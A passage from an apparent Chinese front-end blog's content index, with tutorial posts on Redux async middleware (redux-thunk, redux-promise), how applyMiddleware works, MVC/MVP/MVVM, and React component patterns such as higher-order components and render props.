addTodoWithThunk = (val) =&gt; async (dispatch, getState)=&gt;&#123;    //请求之前的一些处理    let value = await Promise.resolve(val + &#x27; thunk&#x27;);    dispatch(&#123;        type:CONSTANT.ADD_TO_DO_THUNK,        payload:&#123;            value        &#125;    &#125;);&#125;;\n\n\n而它使用起来最大的问题，就是重复的模板代码太多\n\n//action typesconst GET_DATA = &#x27;GET_DATA&#x27;,    GET_DATA_SUCCESS = &#x27;GET_DATA_SUCCESS&#x27;,    GET_DATA_FAILED = &#x27;GET_DATA_FAILED&#x27;;    //action creatorconst getDataAction = (id) =&gt; (dispatch, getState) =&gt; &#123;        dispatch(&#123;            type: GET_DATA,             payload: id        &#125;)        api.getData(id) //注：本文所有示例的api.getData都返回promise对象            .then(response =&gt; &#123;                dispatch(&#123;                    type: GET_DATA_SUCCESS,                    payload: response                &#125;)            &#125;)            .catch(error =&gt; &#123;                dispatch(&#123;                    type: GET_DATA_FAILED,                    payload: error                &#125;)            &#125;)     &#125;&#125;//reducerconst reducer = (oldState, action) =&gt; &#123;    switch(action.type) &#123;    case GET_DATA :         return oldState;    case GET_DATA_SUCCESS :         return successState;    case GET_DATA_FAILED :         return errorState;    &#125;&#125;\n\n\n这已经是最简单的场景了，请注意：我们甚至还没写一行业务逻辑，如果每个异步处理都像这样，重复且无意义的工作会变成明显的阻碍\n\n\n另一方面，像GET_DATA_SUCCESS、GET_DATA_FAILED这样的字符串声明也非常无趣且易错上例中，GET_DATA这个action并不是多数场景需要的\n\nredux-promise\n\n由于redux-thunk写起来实在是太麻烦了，社区当然会有其它轮子出现。redux-promise则是其中比较知名的\n\n\n它自定义了一个\nmiddleware\n\n，当检测到有\naction\n\n的\npayload\n\n属性是\nPromise\n\n对象时，就会\n\n若resolve，触发一个此action的拷贝，但payload为promise的value，并设status属性为&quot;success&quot;\n若reject，触发一个此action的拷贝，但payload为promise的reason，并设status属性为&quot;error&quot;\n\n\n\n//action typesconst GET_DATA = &#x27;GET_DATA&#x27;;//action creatorconst getData = function(id) &#123;    return &#123;        type: GET_DATA,        payload: api.getData(id) //payload为promise对象    &#125;&#125;//reducerfunction reducer(oldState, action) &#123;    switch(action.type) &#123;        case GET_DATA:             if (action.status === &#x27;success&#x27;) &#123;                return successState            &#125; else &#123;                   return errorState            &#125;        &#125;&#125;\n\n\nredux-promise为了精简而做出的妥协非常明显：无法处理乐观更新\n\n场景解析之：乐观更新\n\n多数异步场景都是悲观更新的，即等到请求成功才渲染数据。而与之相对的乐观更新，则是不等待请求成功，在发送请求的同时立即渲染数据\n\n\n由于乐观更新发生在用户操作时，要处理它，意味着必须有action表示用户的初始动作\n在上面redux-thunk的例子中，我们看到了GET_DATA, GET_DATA_SUCCESS、GET_DATA_FAILED三个action，分别表示初始动作、异步成功和异步失败，其中第一个action使得redux-thunk具备乐观更新的能力\n而在redux-promise中，最初触发的action被中间件拦截然后过滤掉了。原因很简单，redux认可的action对象是 plain JavaScript objects，即简单对象，而在redux-promise中，初始action的payload是个Promise\n\nredux-promise-middleware\n\nredux-promise-middleware`相比`redux-promise`，采取了更为温和和渐进式的思路，保留了和`redux-thunk`类似的三个`action\n\n//action typesconst GET_DATA = &#x27;GET_DATA&#x27;,    GET_DATA_PENDING = &#x27;GET_DATA_PENDING&#x27;,    GET_DATA_FULFILLED = &#x27;GET_DATA_FULFILLED&#x27;,    GET_DATA_REJECTED = &#x27;GET_DATA_REJECTED&#x27;;    //action creatorconst getData = function(id) &#123;    return &#123;        type: GET_DATA,        payload: &#123;            promise: api.getData(id),            data: id        &#125;    &#125;&#125;//reducerconst reducer = function(oldState, action) &#123;    switch(action.type) &#123;    case GET_DATA_PENDING :        return oldState; // 可通过action.payload.data获取id    case GET_DATA_FULFILLED :         return successState;    case GET_DATA_REJECTED :         return errorState;    &#125;&#125;\n\n五、redux异步操作代码演示\n根据官网的async例子分析 https://github.com/lewis617/react-redux-tutorial/tree/master/redux-examples/async\n\naction&#x2F;index.js\nimport fetch from &#x27;isomorphic-fetch&#x27;export const RECEIVE_POSTS = &#x27;RECEIVE_POSTS&#x27;//获取新闻成功的actionfunction receivePosts(reddit, json) &#123;  return &#123;    type: RECEIVE_POSTS,    reddit: reddit,    posts: json.data.children.map(child =&gt;child.data)  &#125;&#125;function fetchPosts(subreddit) &#123;  return function (dispatch) &#123;        return fetch(`http://www.subreddit.com/r/$&#123;subreddit&#125;.json`)      .then(response =&gt; response.json())      .then(json =&gt;        dispatch(receivePosts(subreddit, json))      )  &#125;&#125;//如果需要则开始获取文章export function fetchPostsIfNeeded(subreddit) &#123;  return (dispatch, getState) =&gt; &#123;      return dispatch(fetchPosts(subreddit))    &#125;&#125;\n\n\nfetchPostsIfNeeded这里就是一个中间件。redux-thunk会拦截fetchPostsIfNeeded这个action，会先发起数据请求，如果成功，就将数据传给action从而到达reducer那里\n\nreducers&#x2F;index.js\nimport &#123; combineReducers &#125; from &#x27;redux&#x27;import &#123;  RECEIVE_POSTS&#125; from &#x27;../actions&#x27;function posts(state = &#123;  items: []&#125;, action) &#123;  switch (action.type) &#123;    case RECEIVE_POSTS:      // Object.assign是ES6的一个语法。合并对象，将对象合并为一个，前后相同的话，后者覆盖强者。详情可以看这里      //  https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/assign      return Object.assign(&#123;&#125;, state, &#123;        items: action.posts //数据都存在了这里      &#125;)    default:      return state  &#125;&#125;// 将所有的reducer结合为一个,传给storeconst rootReducer = combineReducers(&#123;  postsByReddit&#125;)export default rootReducer\n\n\n这个跟正常的reducer差不多。判断action的类型，从而根据action的不同类型，返回不同的数据。这里将数据存储在了items这里。这里的reducer只有一个。最后结合成rootReducer,传给store\n\nstore&#x2F;configureStore.js\nimport &#123; createStore, applyMiddleware &#125; from &#x27;redux&#x27;import thunkMiddleware from &#x27;redux-thunk&#x27;import createLogger from &#x27;redux-logger&#x27;import rootReducer from &#x27;../reducers&#x27;const createStoreWithMiddleware = applyMiddleware(  thunkMiddleware,    createLogger()  )(createStore)export default function configureStore(initialState) &#123;  const store = createStoreWithMiddleware(rootReducer, initialState)  if (module.hot) &#123;    // Enable Webpack hot module replacement for reducers    module.hot.accept(&#x27;../reducers&#x27;, () =&gt; &#123;      const nextRootReducer = require(&#x27;../reducers&#x27;)      store.replaceReducer(nextRootReducer)    &#125;)  &#125;  return store&#125;\n\n\n我们是如何在 dispatch 机制中引入 Redux Thunk middleware 的呢？我们使用了applyMiddleware()\n通过使用指定的 middleware，action creator 除了返回 action 对象外还可以返回函数\n这时，这个 action creator 就成为了 thunk\n\n界面上的调用：在containers&#x2F;App.js\n//初始化渲染后触发  componentDidMount() &#123;    const &#123; dispatch&#125; = this.props    // 这里可以传两个值，一个是 reactjs 一个是 frontend    dispatch(fetchPostsIfNeeded(&#x27;frontend&#x27;))  &#125;\n\n\n改变状态的时候也是需要通过dispatch来传递的\n\n\n数据的获取是通过provider,将store里面的数据注入给组件。让顶级组件提供给他们的子孙组件调用。代码如下：\n\nimport &#x27;babel-core/polyfill&#x27;import React from &#x27;react&#x27;import &#123; render &#125; from &#x27;react-dom&#x27;import &#123; Provider &#125; from &#x27;react-redux&#x27;import App from &#x27;./containers/App&#x27;import configureStore from &#x27;./store/configureStore&#x27;const store = configureStore()render(  &lt;Provider store=&#123;store&#125;&gt;    &lt;App /&gt;  &lt;/Provider&gt;,  document.getElementById(&#x27;root&#x27;))\n\n\n这样就完成了redux的异步操作。其实最主要的区别还是action里面还有中间件的调用，其他的地方基本跟同步的redux差不多的。搞懂了中间件，就基本搞懂了redux的异步操作\n\n\n","categories":["框架"],"tags":["Redux"]},{"title":"Redux 中间件","url":"/2020/04/17/React/Redux-%E4%B8%AD%E9%97%B4%E4%BB%B6/","content":"一、前言\n在redux里，middleware是发送action和action到达reducer之间的第三方扩展，也就是中间层。也可以这样说，middleware是架在action和store之间的一座桥梁\n在redux里，action仅仅是携带了数据的普通js对象\n\n\nReducer 拆分可以使组件获取其最小属性(state)，而不需要整个Store。中间件则可以在Action Creator 返回最终可供 dispatch 调用的 action 之前处理各种事情，如异步API调用、日志记录等，是扩展 Redux 功能的一种推荐方式\n\n\nRedux 提供了 applyMiddleware(...middlewares) 来将中间件应用到 createStore。applyMiddleware会返回一个函数，该函数接收原来的 creatStore 作为参数，返回一个应用了 middlewares 的增强后的 creatStore\n\nexport default function applyMiddleware(...middlewares) &#123;  return (createStore) =&gt; (reducer, preloadedState, enhancer) =&gt; &#123;    //接收createStore参数    var store = createStore(reducer, preloadedState, enhancer)    var dispatch = store.dispatch    var chain = []    //传递给中间件的参数    var middlewareAPI = &#123;      getState: store.getState,      dispatch: (action) =&gt; dispatch(action)    &#125;    //注册中间件调用链    chain = middlewares.map(middleware =&gt; middleware(middlewareAPI))    dispatch = compose(...chain)(store.dispatch)    //返回经middlewares增强后的createStore    return &#123;      ...store,      dispatch    &#125;  &#125;&#125;\n\n\n未应用中间价之前，创建 store 的方式如下\n\nimport &#123;createStore&#125; from &#x27;redux&#x27;;import reducers from &#x27;./reducers/index&#x27;;export let store = createStore(reducers);\n\n\n应用中间价之后，创建 store的方式如下\n\nimport &#123;createStore，applyMiddleware&#125; from &#x27;redux&#x27;;import reducers from &#x27;./reducers/index&#x27;;let createStoreWithMiddleware = applyMiddleware(...middleware)(createStore);export let store = createStoreWithMiddleware(reducers);\n\n二、为什么要引入middleware\naction creator返回的值是这个action类型的对象。然后通过store.dispatch()进行分发\n\naction ---&gt; dispatcher ---&gt; reducers\n\n\n如果遇到异步情况，比如点击一个按钮，希望2秒之后更新视图，显示消息“Hi”。我们可能这么写ActionCreator\n\nvar asyncSayActionCreator = function (message) &#123;    setTimeout(function () &#123;        return &#123;            type: &#x27;SAY&#x27;,            message        &#125;    &#125;, 2000)&#125;\n\n\n这会报错，因为这个asyncSayActionCreator返回的不是一个action，而是一个function。这个返回值无法被reducer识别\n\n\n也就是说，正常来说，action返回的是一个对象，而不是一个函数。如果返回函数，会出现错误\n　而异步操作呢，需要action的返回值是一个函数。那么咋办呢，所以需要引入中间件middleware,它在中间起到了桥梁的作用，让action的返回值可以是一个函数，从而传到reducer那里。也就是说，中间件是用在action发起之后，reducer接收到之前的这个时间段\n也可以这么说，Middleware 主要是负责改变Store中的dispatch方法，从而能处理不同类型的 action 输入，得到最终的 Javascript Plain Object 形式的 action 对象\n\n\n因此，上面那个ActionCreator就可以改写为这样：因为action的返回值是一个函数\n\nvar asyncSayActionCreator = function (message) &#123;    return function (dispatch) &#123;        setTimeout(function () &#123;            dispatch(&#123;                type: &#x27;SAY&#x27;,                message            &#125;)        &#125;, 2000)    &#125;&#125;\n\n\n\n上图表达的是 redux 中一个简单的同步数据流动的场景，点击button 后，在回调中 dispatch 一个 action，reducer 收到action 后，更新 state 并通知 view 重新渲染\n\n\n\n上面这张图展示了应用\nmiddleware\n\n后\nredux\n\n处理事件的逻辑，每一个\nmiddleware\n\n处理一个相对独立的业务需求，通过串联不同的\nmiddleware\n\n，实现变化多样的的功能。那么问题来了：\n\nmiddleware 怎么写？\nredux是如何让 middlewares 串联并跑起来的？\n\n\n\n三、中间件是如何工作的\nMiddleware`的中间件有很多，不过我的这个案例只引用了其中的一个，那就是`redux-thunk\n\n\nredux-thunk源码如下\n\nexport default function thunkMiddleware(&#123; dispatch, getState &#125;) &#123;  return next =&gt; action =&gt;    typeof action === &#x27;function&#x27; ?      action(dispatch, getState) :      next(action);&#125;\n\n\n意思是如果action是一个函数，执行这个action函数，如果不是函数，执行next函数\n\n四、自定义中间件\n中间件的签名如下\n\n(&#123; getState, dispatch &#125;) =&gt; next =&gt; action\n\n\n根据applyMiddleware 源码，每个中间件接收 getState &amp; dispatch作为参数，并返回一个函数，该函数会被传入下一个中间件的 dispatch 方法，并返回一个接收 action 的新函数\n\n\n应用多个中间件时，中间件调用链中任何一个缺少 next(action) 的调用，都会导致action 执行失败\n\nfunction callTraceMiddleware (&#123;dispatch,getState&#125;)&#123;    return next=&gt; action =&gt;&#123;        console.trace();        return next(action);    &#125;&#125;\n\n\n然后在调用中间件部分添加中间件\n\nconst createStoreWithMiddleware = applyMiddleware(  thunkMiddleware,  loggerMiddleware,  callTraceMiddleware)(createStore);\n\n\nredux的middleware是对action进行扩展处理，这样丰富了应用需求\n\n五、常用的中间件有很多优秀的redux中间件，如：\n\nredux-thunk：用于异步操作\nredux-logger：用于日志记录\n\n上述的中间件都需要通过applyMiddlewares进行注册，作用是将所有的中间件组成一个数组，依次执行\n然后作为第二个参数传入到createStore中\nconst store = createStore(  reducer,  applyMiddleware(thunk, logger));\n\nredux-thunkredux-thunk是官网推荐的异步处理中间件\n默认情况下的dispatch(action)，action需要是一个JavaScript的对象\nredux-thunk中间件会判断你当前传进来的数据类型，如果是一个函数，将会给函数传入参数值（dispatch，getState）\n\ndispatch函数用于我们之后再次派发action\ngetState函数考虑到我们之后的一些操作需要依赖原来的状态，用于让我们可以获取之前的一些状态\n\n所以dispatch可以写成下述函数的形式：\nconst getHomeMultidataAction = () =&gt; &#123;  return (dispatch) =&gt; &#123;    axios.get(&quot;http://xxx.xx.xx.xx/test&quot;).then(res =&gt; &#123;      const data = res.data.data;      dispatch(changeBannersAction(data.banner.list));      dispatch(changeRecommendsAction(data.recommend.list));    &#125;)  &#125;&#125;\n\nredux-logger如果想要实现一个日志功能，则可以使用现成的redux-logger\nimport &#123; applyMiddleware, createStore &#125; from &#x27;redux&#x27;;import createLogger from &#x27;redux-logger&#x27;;const logger = createLogger();const store = createStore(  reducer,  applyMiddleware(logger));\n\n这样我们就能简单通过中间件函数实现日志记录的信息\n六、实现原理首先看看applyMiddlewares的源码\nexport default function applyMiddleware(...middlewares) &#123;  return (createStore) =&gt; (reducer, preloadedState, enhancer) =&gt; &#123;    var store = createStore(reducer, preloadedState, enhancer);    var dispatch = store.dispatch;    var chain = [];    var middlewareAPI = &#123;      getState: store.getState,      dispatch: (action) =&gt; dispatch(action)    &#125;;    chain = middlewares.map(middleware =&gt; middleware(middlewareAPI));    dispatch = compose(...chain)(store.dispatch);    return &#123;...store, dispatch&#125;  &#125;&#125;\n\n所有中间件被放进了一个数组chain，然后嵌套执行，最后执行store.dispatch。可以看到，中间件内部（middlewareAPI）可以拿到getState和dispatch这两个方法\n在上面的学习中，我们了解到了redux-thunk的基本使用\n内部会将dispatch进行一个判断，然后执行对应操作，原理如下：\nfunction patchThunk(store) &#123;    let next = store.dispatch;    function dispatchAndThunk(action) &#123;        if (typeof action === &quot;function&quot;) &#123;            action(store.dispatch, store.getState);        &#125; else &#123;            next(action);        &#125;    &#125;    store.dispatch = dispatchAndThunk;&#125;\n\n\n\n实现一个日志输出的原理也非常简单，如下：\nlet next = store.dispatch;function dispatchAndLog(action) &#123;  console.log(&quot;dispatching:&quot;, addAction(10));  next(addAction(5));  console.log(&quot;新的state:&quot;, store.getState());&#125;store.dispatch = dispatchAndLog;","categories":["框架"],"tags":["Redux"]},{"title":"MVC、MVP、MVVM之间的关系","url":"/2018/06/08/Vue/MVC%E3%80%81MVP%E3%80%81MVVM%E4%B9%8B%E9%97%B4%E7%9A%84%E5%85%B3%E7%B3%BB/","content":"一、MVC\n什么是MVC\n\nMVC是一种模式，它将应用分为3个部分：数据（模型）、表现层（视图）、用户交互层（控制器）\n一个事件的处理大概是这样\n用户和应用产生交互\n控制器的事件处理器被触发\n控制器从模型中请求数据，并将其交给视图\n视图将数据呈现给用户\n\n\n\n模型（数据保存）\n\n模型用来存放用户的所有数据对象。比如有一个user模型，用来存放用户列表、他们的属性以及所有和模型有关的逻辑\n模型不必知晓视图和控制器的细节，模型只需包含数据以及直接和这些数据相关的逻辑\n\n视图（用户界面）\n\n视图是呈现给用户的，用户与之产生交互。在JavaScript应用中，视图大都是由HTML、css、JavaScript模板组成的\n\n控制器（业务逻辑）\n\n控制器是模型和视图之间的纽带。控制器从视图获得事件和输入，对它们进行进行处理，并相应的更新视图。\n当页面加载时，控制器会给视图添加事件监听，比如监听表单提交或按钮点击。然后当用户和你的应用产生交互时，控制器中的事件触发器就开始工作了\n\n总结一下：\n\nController 监听 Model 变化，Model 一变，Controller 就会去更新View。\nController 监听用户交互，用户点了提交或修改按钮，Controller 就要去更新 Model\nView 传送指令到 Controller\nController 完成业务逻辑后，要求 Model 改变状态\nModel 将新的数据发送到 View，用户得到反馈\n\n各部分之间的通信方式\n互动模式\n\n接受用户指令时，MVC 可以分成两种方式。一种是通过 View 接受指令，传递给 Controller\n\n另一种是直接通过controller接受指令\n\n\n二、MVP\n\nMVP 模式将 Controller 改名为Presenter&#96;，同时改变了通信方向\n\n各部分之间的通信，都是双向的。\n\nView 与Model 不发生联系，都通过 Presenter 传递。\n\nView 非常薄，不部署任何业务逻辑，称为”被动视图”（Passive View），即没有任何主动性，而 Presenter非常厚，所有逻辑都部署在那里\n\n\n三、MVVM\n\nMVVM 模式将 Presenter 改名为 ViewModel，基本上与 MVP 模式完全一致\n唯一的区别是，它采用双向绑定（data-binding）：View的变动，自动反映在 ViewModel，反之亦然\n\n","categories":["架构模式"],"tags":["vue"]},{"title":"React设计模式和最佳实践总结（底层总结）","url":"/2020/04/08/React/React-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%92%8C%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5%E6%80%BB%E7%BB%93/","content":"一、组件实践1.1 设计原则\n保持接口小，props 数量要少\n根据数据边界来划分组件，充分利用组合\n把 state 往上层组件提取，让下层组件只需要实现为纯函数\n\n1.2 组件划分\n任何一个复杂组件都是从简单组件开始的，一开始我们在 render 函数里写的代码不多，但是随着逻辑的复杂，JSX 代码越来越多，于是，就需要拆分函数中的内容\n\n\n在 React 中，有一个误区，就是把 render 中的代码分拆到多个 renderXXXX 函数中去，比如下面这样\n\nclass StopWatch extends React.Component &#123;  render() &#123;    const majorClock = this.renderMajorClock();    const controlButtons = this.renderControlButtons();    const splitTimes = this.renderSplitTimes();        return (       &lt;div&gt;          &#123;majorClock&#125;          &#123;controlButtons&#125;          &#123;splitTimes&#125;       &lt;/div&gt;    );  &#125;    renderMajorClock() &#123;     //TODO: 返回数字时钟的JSX  &#125;    renderControlButtons() &#123;     //TODO: 返回两个按钮的JSX  &#125;    renderSplitTimes() &#123;     //TODO: 返回所有计次时间的JSX  &#125;&#125;\n\n\n用上面的方法组织代码，当然比写一个巨大的 render 函数要强，但是，实现这么多 renderXXXX 函数并不是一个明智之举，因为这些 renderXXXX 函数访问的是同样的 props 和 state，这样代码依然耦合在了一起。更好的方法，是把这些 renderXXXX 重构成各自独立的 React 组件，像下面这样\n\nclass StopWatch extends React.Component &#123;  render() &#123;    return (       &lt;div&gt;          &lt;MajorClock&gt;          &lt;ControlButtons&gt;          &lt;SplitTimes&gt;       &lt;/div&gt;    );  &#125;&#125;const MajorClock = (props) =&gt; &#123;  //TODO: 返回数字时钟的JSX&#125;;const ControlButtons = (props) =&gt; &#123;  //TODO: 返回两个按钮的JSX&#125;;  const SplitTimes = (props) =&gt; &#123;  //TODO: 返回所有计次时间的JSX&#125;\n\n\n我们创造了 MajorClock、ControlButtons 和 SplitTimes 这三个组件，目前，我们并不知道它们是否应该有自己的 state，但是从简单开始，首先假设它们没有自己的 state，定义为函数形式的无状态组件\n\n组件 props 的设计\n\n使用 propTypes 来定义组件的 props\n\nconst ControlButtons = (props) =&gt; &#123;  //TODO: 返回两个按钮的JSX&#125;;ControlButtons.propTypes = &#123;  activated: PropTypes.bool,  onStart: PropTypes.func.isRquired,  onPause: PropTypes.func.isRquired,  onSplit: PropTypes.func.isRquired,  onReset: PropTypes.func.isRquired,  splits: PropTypes.arrayOf(PropTypes.number)&#125;;\n\n1.3 组件内部实现\n尽量每个组件都有自己专属的源代码文件\n用解构赋值（destructuring assignment）的方法获取参数 props 的每个属性值\n利用属性初始化（property initializer）来定义 state 和成员函数\n\n属性初始化方法\n\n尽量不要在 JSX 中写内联函数（inline function），比如这样写，是很不恰当的\n\n&lt;ControlButtons  activated=&#123;this.state.isStarted&#125;  onStart=&#123;() =&gt; &#123; /* TODO */&#125;&#125;  onPause=&#123;() =&gt; &#123; /* TODO */&#125;&#125;  onReset=&#123;() =&gt; &#123; /* TODO */&#125;&#125;  onSplit=&#123;() =&gt; &#123; /* TODO */&#125;&#125;/&gt;\n\n\n当然，按照上面那种写法，也可以完成程序的功能，但是，会带来性能的代价。首先，每一次渲染这段 JSX，都会产生全新的函数对象，这是一种浪费；其次，因为每一次传给 ControlButtons 的都是新的 props，这样 ControlButtons 也无法通过 shouldComponentUpdate 对 props 的检查来避免重复渲染\n\n二、组件设计模式2.1 高阶组件\n在开发 React 组件过程中，很容易发现这样一种现象，某些功能是多个组件通用的，如果每个组件都重复实现这样的逻辑，肯定十分浪费，而且违反了“不要重复自己”（DRY，Don’t Repeat Yourself)的编码原则，我们肯定想要把这部分共用逻辑提取出来重用\n我们说过，在 React 的世界里，组件是第一公民，首先想到的是当然是把共用逻辑提取为一个 React 组件。不过，有些情况下，这些共用逻辑还没法成为一个独立组件，换句话说，这些共用逻辑单独无法使用，它们只是对其他组件的功能加强\n\n高阶组件的基本形式\n\n“高阶组件”名为“组件”，其实并不是一个组件，而是一个函数，只不过这个函数比较特殊，它接受至少一个 React 组件为参数，并且能够返回一个全新的 React 组件作为结果，当然，这个新产生的 React 组件是对作为参数的组件的包装，所以，有机会赋予新组件一些增强的“神力”\n\n一个最简单的高阶组件是这样的形式\nconst withDoNothing = (Component) =&gt; &#123;  const NewComponent = (props) =&gt; &#123;    return &lt;Component &#123;...props&#125; /&gt;;  &#125;;  return NewComponent;&#125;;\n\n\n上面的函数 withDoNothing 就是一个高阶组件，作为一项业界通用的代码规范，高阶组件的命名一般都带 with 前缀，命名中后面的部分代表这个高阶组件的功能\n\n\n就如同 withDoNothing 这个名字所说的一样，这个高阶组件什么都没做，但是从中可以看出高阶组件的基本代码套路\n\n\n高阶组件不能去修改作为参数的组件，高阶组件必须是一个纯函数，不应该有任何副作用。\n高阶组件返回的结果必须是一个新的 React 组件，这个新的组件的 JSX 部分肯定会包含作为参数的组件\n高阶组件一般需要把传给自己的 props 转手传递给作为参数的组件\n\n用高阶组件抽取共同逻辑\n\n接下来，我们对 withDoNothing 进行一些改进，让它实现“只有在登录时才显示”这个功能\n\n假设我们已经有一个函数 getUserId 能够从 cookies 中读取登录用户的 ID，如果用户未登录，这个 getUserId 就返回空，那么“退出登录按钮“就需要这么写：\nconst LogoutButton = () =&gt; &#123;  if (getUserId()) &#123;    return ...; // 显示”退出登录“的JSX  &#125; else &#123;    return null;  &#125;&#125;;\n\n同样，购物车的代码就是这样\nconst ShoppintCart = () =&gt; &#123;  if (getUserId()) &#123;    return ...; // 显示”购物车“的JSX  &#125; else &#123;    return null;  &#125;&#125;;\n\n\n上面两个组件明显有重复的代码，我们可以把重复代码抽取出来，形成 withLogin 这个高阶组件，代码如下\n\nconst withLogin = (Component) =&gt; &#123;  const NewComponent = (props) =&gt; &#123;    if (getUserId()) &#123;      return &lt;Component &#123;...props&#125; /&gt;;    &#125; else &#123;      return null;    &#125;  &#125;  return NewComponent;&#125;;\n\n\n如此一来，我们就只需要这样定义 LogoutButton 和 ShoppintCart：\n\nconst LogoutButton = withLogin((props) =&gt; &#123;  return ...; // 显示”退出登录“的JSX&#125;);const ShoppingCart = withLogin(() =&gt; &#123;  return ...; // 显示”购物车“的JSX&#125;);\n\n\n我们避免了重复代码，以后如果要修改对用户是否登录的判断逻辑，也只需要修改 withLogin，而不用修改每个 React 组件\n\n高阶组件的高级用法\n\n高阶组件只需要返回一个 React 组件即可，没人规定高阶组件只能接受一个 React 组件作为参数，完全可以传入多个 React 组件给高阶组件\n比如，我们可以改进上面的 withLogin，让它接受两个 React 组件，根据用户是否登录选择渲染合适的组件\n\nconst withLoginAndLogout = (ComponentForLogin, ComponentForLogout) =&gt; &#123;  const NewComponent = (props) =&gt; &#123;    if (getUserId()) &#123;      return &lt;ComponentForLogin &#123;...props&#125; /&gt;;    &#125; else &#123;      return &lt;ComponentForLogout&#123;...props&#125; /&gt;;    &#125;  &#125;  return NewComponent;&#125;;\n\n\n有了上面的 withLoginAndLogout，就可以产生根据用户登录状态显示不同的内容\n\nconst TopButtons = withLoginAndLogout(  LogoutButton,  LoginButton);\n\n链式调用高阶组件\n\n高阶组件最巧妙的一点，是可以链式调用。\n假设，你有三个高阶组件分别是 withOne、withTwo 和 withThree，那么，如果要赋予一个组件 X 某个高阶组件的超能力，那么，你要做的就是挨个使用高阶组件包装，代码如下\n\nconst X1 = withOne(X);const X2 = withTwo(X1);const X3 = withThree(X2);const SuperX = X3; //最终的SuperX具备三个高阶组件的超能力\n\n很自然，我们可以避免使用中间变量 X1 和 X2，直接连续调用高阶组件，如下\nconst SuperX = withThree(withTwo(withOne(X)));\n\n对于 X 而言，它被高阶组件包装了，至于被一个高阶组件包装，还是被 N 个高阶组件包装，没有什么差别。而高阶组件本身就是一个纯函数，纯函数是可以组合使用的，所以，我们其实可以把多个高阶组件组合为一个高阶组件，然后用这一个高阶组件去包装X，代码如下\nconst hoc = compose(withThree, withTwo, withOne);const SuperX = hoc(X);\n\n\n上面代码中使用的 compose，是函数式编程中很基础的一种方法，作用就是把多个函数组合为一个函数，在很多开源的代码库中都可以看到，下面是一个参考实现\n\nexport default function compose(...funcs) &#123;  if (funcs.length === 0) &#123;    return arg =&gt; arg  &#125;  if (funcs.length === 1) &#123;    return funcs[0]  &#125;  return funcs.reduce((a, b) =&gt; (...args) =&gt; a(b(...args)))&#125;\n\n\nReact 组件可以当做积木一样组合使用，现在有了 compose，我们就可以把高阶组件也当做积木一样组合，进一步重用代码。\n假如一个应用中多个组件都需要同样的多个高阶组件包装，那就可以用 compose 组合这些高阶组件为一个高阶组件，这样在使用多个高阶组件的地方实际上就只需要使用一个高阶组件了\n\n不要滥用高阶组件\n\n高阶组件虽然可以用一种可重用的方式扩充现有 React 组件的功能，但高阶组件并不是绝对完美的\n\n首先，高阶组件不得不处理 displayName，不然 debug 会很痛苦。当 React 渲染出错的时候，靠组件的 displayName 静态属性来判断出错的组件类，而高阶组件总是创造一个新的 React 组件类，所以，每个高阶组件都需要处理一下 displayName\n如果要做一个最简单的什么增强功能都没有的高阶组件，也必须要写下面这样的代码\nconst withExample = (Component) =&gt; &#123;  const NewComponent = (props) =&gt; &#123;    return &lt;Component &#123;...props&#125; /&gt;;  &#125;    NewComponent.displayName = `withExample($&#123;Component.displayName || Component.name || &#x27;Component&#x27;&#125;)`;    return NewCompoennt;&#125;;\n\n每个高阶组件都这么写，就会非常的麻烦\n对于 React 生命周期函数，高阶组件不用怎么特殊处理，但是，如果内层组件包含定制的静态函数，这些静态函数的调用在 React 生命周期之外，那么高阶组件就必须要在新产生的组件中增加这些静态函数的支持，这更加麻烦\n\n其次，高阶组件支持嵌套调用，这是它的优势。但是如果真的一大长串高阶组件被应用的话，当组件出错，你看到的会是一个超深的 stack trace，十分痛苦\n\n\n最后，使用高阶组件，一定要非常小心，要避免重复产生 React 组件，比如，下面的代码是有问题的\n\nconst Example = () =&gt; &#123;  const EnhancedFoo = withExample(Foo);  return &lt;EnhancedFoo /&gt;&#125;\n\n像上面这样写，每一次渲染 Example，都会用高阶组件产生一个新的组件，虽然都叫做 EnhancedFoo，但是对 React 来说是一个全新的东西，在重新渲染的时候不会重用之前的虚拟 DOM，会造成极大的浪费\n正确的写法是下面这样，自始至终只有一个 EnhancedFoo 组件类被创建\nconst EnhancedFoo = withExample(Foo);const Example = () =&gt; &#123;  return &lt;EnhancedFoo /&gt;&#125;\n\nrender props 模式\n所谓 render props，指的是让 React 组件的 props 支持函数这种模式。因为作为 props 传入的函数往往被用来渲染一部分界面，所以这种模式被称为 render props\n\n一个最简单的 render props 组件 RenderAll，代码如下\nconst RenderAll = (props) =&gt; &#123;  return(     &lt;React.Fragment&gt;     \t&#123;props.children(props)&#125;     &lt;/React.Fragment&gt;  );&#125;;\n\n\n这个 RenderAll 预期子组件是一个函数，它所做的事情就是把子组件当做函数调用，调用参数就是传入的 props，然后把返回结果渲染出来，除此之外什么事情都没有做\n\n&lt;RenderAll&gt;&#123;() =&gt; &lt;h1&gt;hello world&lt;/h1&gt;&#125;&lt;/RenderAll&gt;\n\n可以看到，RenderAll 的子组件，也就是夹在 RenderAll 标签之间的部分，其实是一个函数。这个函数渲染出 hello world，这就是上面使用 RenderAll 渲染出来的结果。\n当然，这个 RenderAll 没做任何实际工作，接下来我们看 render props 真正强悍的使用方法。\n传递 props\n\n和高阶组件一样，render props 可以做很多的定制功能，我们还是以根据是否登录状态来显示一些界面元素为例，来实现一个 render props\n\n下面是实现 render props 的 Login 组件，可以看到，render props 和高阶组件的第一个区别，就是 render props 是真正的 React 组件，而不是一个返回 React 组件的函数。\nconst Login = (props) =&gt; &#123;  const userName = getUserName();  if (userName) &#123;    const allProps = &#123;userName, ...props&#125;;    return (      &lt;React.Fragment&gt;        &#123;props.children(allProps)&#125;      &lt;/React.Fragment&gt;    );  &#125; else &#123;    return null;  &#125;&#125;;\n\n当用户处于登录状态，getUserName 返回当前用户名，否则返回空，然后我们根据这个结果决定是否渲染 props.children 返回的结果。\n当然，render props 完全可以决定哪些 props 可以传递给 props.children，在 Login 中，我们把 userName 作为增加的 props 传递给下去，这样就是 Login 的增强功能。\n一个使用上面 Login 的 JSX 代码示例如下\n&lt;Login&gt;&#123;(&#123;userName&#125;) =&gt; &lt;h1&gt;Hello &#123;userName&#125;&lt;/h1&gt;&#125;&lt;/Login&gt;\n\n不局限于 children\n实际上，render props 这个模式不必局限于 children 这一个 props，任何一个 props 都可以作为函数，也可以利用多个 props 来作为函数。\n我们来扩展 